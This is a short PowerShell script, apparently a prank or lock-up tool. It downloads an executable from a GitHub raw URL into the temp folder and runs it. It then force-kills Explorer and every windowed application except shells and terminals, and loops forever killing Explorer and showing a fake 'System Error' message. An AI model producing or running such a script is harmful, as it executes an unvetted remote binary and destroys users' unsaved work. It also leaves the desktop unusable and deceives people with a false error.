powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Cancarutu2012/rroll/refs/heads/main/buttery-taskbar.exe' -OutFile '$env:TEMP\test.exe'; Start-Process '$env:TEMP\test.exe'"
Stop-Process -Name explorer -Force
$exclude = @(
    "powershell",
    "pwsh",
    "cmd",
    "WindowsTerminal"
)

Get-Process |
Where-Object {
    $_.MainWindowHandle -ne 0 -and
    $exclude -notcontains $_.ProcessName
} |
Stop-Process -Force

Add-Type -AssemblyName PresentationFramework

while ($true) {

Stop-Process -Name explorer -Force

    [System.Windows.MessageBox]::Show(
        "Something went wrong. Please try again.",
        "System Error",
        "OK",
        "Error"
    )
}
